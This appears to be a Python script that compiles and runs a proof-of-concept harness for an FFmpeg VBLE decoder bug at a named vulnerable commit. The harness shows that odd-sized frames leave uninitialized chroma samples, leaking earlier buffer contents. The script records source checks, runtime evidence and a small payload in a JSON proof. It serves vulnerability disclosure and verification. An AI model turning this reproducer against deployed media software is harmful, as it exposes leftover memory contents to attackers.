"""Build and record VBLE's odd-dimension chroma disclosure proof."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import platform
import subprocess
from datetime import UTC, datetime
from pathlib import Path

SCHEMA_VERSION = "cw.ffmpeg.vble-odd-chroma-disclosure-reproducer.v1"
VULNERABLE_COMMIT = "795bccdaf57772b1803914dee2f32d52776518e2"


def _arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--checkout", type=Path, required=True)
    parser.add_argument(
        "--harness",
        type=Path,
        default=Path(__file__).with_name(
            "ffmpeg_vble_odd_chroma_disclosure_reproducer.c"
        ),
    )
    parser.add_argument("--binary-output", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args()


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def _head(path: Path) -> str:
    result = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=path,
        check=False,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def _compile_command(harness: Path, binary: Path) -> list[str]:
    command = [
        "clang",
        "-I.",
        "-D_ISOC11_SOURCE",
        "-D_FILE_OFFSET_BITS=64",
        "-D_LARGEFILE_SOURCE",
        "-I./compat/dispatch_semaphore",
        "-DPIC",
        "-I./compat/stdbit",
        "-DHAVE_AV_CONFIG_H",
        "-fsanitize=address",
        "-fno-omit-frame-pointer",
        "-ffunction-sections",
        "-g",
        "-O1",
        "-std=c17",
        "-fPIC",
        "-pthread",
    ]
    if platform.system() == "Darwin":
        command.append("-Wl,-dead_strip")
    else:
        command.append("-Wl,--gc-sections")
    command.extend(
        [
            "-o",
            str(binary),
            str(harness),
            "libavcodec/libavcodec.a",
            "libavutil/libavutil.a",
            "-lm",
            "-lz",
        ]
    )
    if platform.system() == "Darwin":
        command.extend(
            [
                "-framework",
                "CoreFoundation",
                "-framework",
                "Security",
                "-liconv",
                "-framework",
                "AudioToolbox",
                "-framework",
                "VideoToolbox",
                "-framework",
                "CoreMedia",
                "-framework",
                "CoreVideo",
                "-framework",
                "CoreServices",
            ]
        )
    command.append("-pthread")
    return command


def main() -> None:
    args = _arguments()
    checkout = args.checkout.expanduser().resolve()
    harness = args.harness.expanduser().resolve()
    binary = args.binary_output.expanduser().resolve()
    output = args.output.expanduser().resolve()
    source = checkout / "libavcodec/vble.c"
    components = checkout / "config_components.h"
    required = (
        harness,
        source,
        components,
        checkout / "libavcodec/libavcodec.a",
        checkout / "libavutil/libavutil.a",
    )
    if _head(checkout) != VULNERABLE_COMMIT or not all(
        path.is_file() for path in required
    ):
        raise ValueError(
            f"configured FFmpeg build must exist at {VULNERABLE_COMMIT}"
        )

    component_text = components.read_text(encoding="utf-8", errors="replace")
    if "#define CONFIG_VBLE_DECODER 1" not in component_text:
        raise ValueError("configured build must enable the VBLE decoder")

    source_text = source.read_text(encoding="utf-8", errors="replace")
    binary.parent.mkdir(parents=True, exist_ok=True)
    output.parent.mkdir(parents=True, exist_ok=True)
    compile_command = _compile_command(harness, binary)
    compile_result = subprocess.run(
        compile_command,
        cwd=checkout,
        check=False,
        capture_output=True,
        text=True,
    )
    environment: dict[str, str] | None = None
    if compile_result.returncode == 0:
        environment = os.environ.copy()
        environment["ASAN_OPTIONS"] = (
            "halt_on_error=1:abort_on_error=1:detect_leaks=0"
        )
        run_result = subprocess.run(
            [str(binary)],
            cwd=checkout,
            env=environment,
            check=False,
            capture_output=True,
            text=True,
        )
    else:
        run_result = subprocess.CompletedProcess(
            [str(binary)], 127, "", "compile failed"
        )

    source_indicators = {
        "decoder_forces_yuv420p": (
            "avctx->pix_fmt = AV_PIX_FMT_YUV420P;" in source_text
        ),
        "symbol_count_uses_full_image_geometry": (
            "ctx->size = av_image_get_buffer_size(avctx->pix_fmt," in source_text
        ),
        "chroma_width_is_rounded_down": (
            "int width_uv = avctx->width / 2" in source_text
        ),
        "chroma_height_is_rounded_down": (
            "height_uv = avctx->height / 2" in source_text
        ),
        "both_chroma_planes_use_floor_geometry": all(
            term in source_text
            for term in (
                "vble_restore_plane(ctx, pic, &gb, 1, offset, width_uv, height_uv);",
                "vble_restore_plane(ctx, pic, &gb, 2, offset, width_uv, height_uv);",
            )
        ),
    }
    combined = run_result.stdout + run_result.stderr
    runtime_indicators = {
        "public_decoder_succeeded": run_result.returncode == 0,
        "odd_yuv420_geometry_returned": (
            "format=0 size=3x3" in run_result.stdout
        ),
        "only_first_u_sample_was_written": (
            "u=00a5/a5a5" in run_result.stdout
        ),
        "only_first_v_sample_was_written": (
            "v=00a5/a5a5" in run_result.stdout
        ),
        "six_visible_marker_bytes_survived": (
            run_result.stdout.count("a5") == 6
        ),
        "sanitizer_clean": "Sanitizer" not in combined,
    }
    expected_observed = (
        compile_result.returncode == 0
        and all(source_indicators.values())
        and all(runtime_indicators.values())
    )
    payload = {
        "schema_version": SCHEMA_VERSION,
        "completed_at": datetime.now(UTC).isoformat(),
        "checkout": str(checkout),
        "checkout_commit": _head(checkout),
        "harness": str(harness),
        "harness_sha256": _sha256(harness),
        "binary": str(binary),
        "binary_sha256": _sha256(binary) if binary.is_file() else None,
        "source": str(source),
        "source_sha256": _sha256(source),
        "payload_hex": "01000000ffffff",
        "compile_command": compile_command,
        "compile_returncode": compile_result.returncode,
        "compile_stdout": compile_result.stdout,
        "compile_stderr": compile_result.stderr,
        "run_command": [str(binary)],
        "asan_options": environment["ASAN_OPTIONS"] if environment else None,
        "returncode": run_result.returncode,
        "stdout": run_result.stdout,
        "stderr": run_result.stderr,
        "source_indicators": source_indicators,
        "runtime_indicators": runtime_indicators,
        "expected_observed": expected_observed,
        "scope": (
            "A public 3x3 VBLE decoder context returns YUV420P, whose visible "
            "chroma geometry is ceil(3/2) by ceil(3/2), or 2x2. The decoder "
            "uses floor division and writes only the first sample of each "
            "plane. A public get_buffer2 callback pre-fills the codec-owned "
            "frame with a marker; six marker bytes survive in visible U/V "
            "samples, proving prior buffer contents can cross into output."
        ),
    }
    temporary = output.with_suffix(output.suffix + ".tmp")
    temporary.write_text(
        json.dumps(payload, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    temporary.replace(output)
    print(output)
    if not expected_observed:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
